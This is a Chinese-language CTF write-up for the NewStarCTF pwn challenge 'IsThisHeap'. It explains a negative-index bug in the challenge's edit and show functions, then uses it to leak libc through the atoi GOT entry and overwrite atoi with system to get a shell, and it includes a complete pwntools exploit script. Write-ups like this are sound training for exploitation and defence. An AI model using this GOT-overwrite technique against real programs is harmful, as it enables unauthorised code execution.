---
title: IsThisHeap
date: 2023-01-02 19:54:26
categories: 
- pwn_wp
tags: 
- pwn
- index overflow
- heap
- got overwrite

---

NewStarCTF，数组下标越界的堆题，改写got表
<!-- more -->

查壳，64位开了canary和NX

```sh
[*] '/home/alphonse/CTF_GAME/new_star/IsThisHeap/pwn'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

有个菜单，有add、delete、edit、show、exit五个功能，但实际上delete没有实现。

在add中最多可以同时存在16个chunk，malloc长度固定为0x30，写入内容的时候可以多写一个'\x00'。

在edit中有下标越界漏洞，没有检查idx是否<0，会从heaps+idx*0x8的位置取出一个指针，并向指针指向的位置写入0x30字节的内容。heaps在0x6020e0，而在0x602080处有一个you_found_me指向自己，可以**修改you_found_me获得一个任意写**，偏移为-12。

在show中依旧没有对下标<0进行检查，仍然有下标越界，会从heaps+idx*0x8的位置取出一个指针，并输出其指向的内容。

也就是说，这题主要是利用edit中下标越界导致的任意写来get shell，这题没开RELRO，说不定可以改个GOT表，有atoi函数，把他改成system，然后输入"/bin/sh"就可以get shell了。

在这之前要看看有没有system，没有的话考虑利用show的下标越界来leak libc。

果然没有system，先看看heaps前面有什么。0x602000~0x602068是.got.plt，应该可以通过leak里面的内容来得到libcbase，atoi的位置是0x602058。

直接将you_found_me修改为0x602058，然后show可以得到libcbase，但在这之后程序就走不动了，可能是因为**写入的时候会在最后追加一个\x00导致__isoc99_scanf错误**。

那不写入8字节，**写入7个字节，反正高位是'\x00'**，把atoi的.got.plt修改为system的地址，然后在atoi函数处输入"/bin/sh\x00"即可get shell。

exp:

```python
from pwn import*
context(log_level='debug',os='linux',arch='amd64')
filename='pwn2'
elf=ELF('./'+filename)
libc=ELF('libc-2.31.so')
p=process('./'+filename)
#p=remote('',)

s       = lambda data               :p.send(data)
sl      = lambda data               :p.sendline(data)
r       = lambda num=4096           :p.recv(num)
rl      = lambda num=4096           :p.recvline(num)
ru      = lambda x                  :p.recvuntil(x)
itr     = lambda                    :p.interactive()
uu32    = lambda data               :u32(data.ljust(4,'\x00'))
uu64    = lambda data               :u64(data.ljust(8,'\x00'))
leak    = lambda name,addr          :log.success('{} = {}'.format(name, addr))

def debug(cmd='\n'):
  gdb.attach(p,cmd)
  pause()

def edit(idx,content):
  ru('>> ')
  sl('3')
  ru("Index:")
  sl(str(idx))
  ru("Content:")
  s(str(content))

def show(idx):
  ru('>> ')
  sl('4')
  ru("Index:")
  sl(str(idx))

atoi_got=0x602058

#leak libcbase
payload=p64(atoi_got)
edit(-12,payload[:-1])

show(-12)
offset=0x445b0
libcbase=uu64(ru('\x7f'))-offset
leak("libcbase",hex(libcbase))

#get shell
sys_addr=libcbase+libc.sym['system']
leak("system",hex(sys_addr))

payload=p64(sys_addr)
debug('b *0x400b29')
edit(-12,payload[:-1])

ru('>> ')
sl('4')
ru("Index:")
s("/bin/sh\x00")

itr()
```

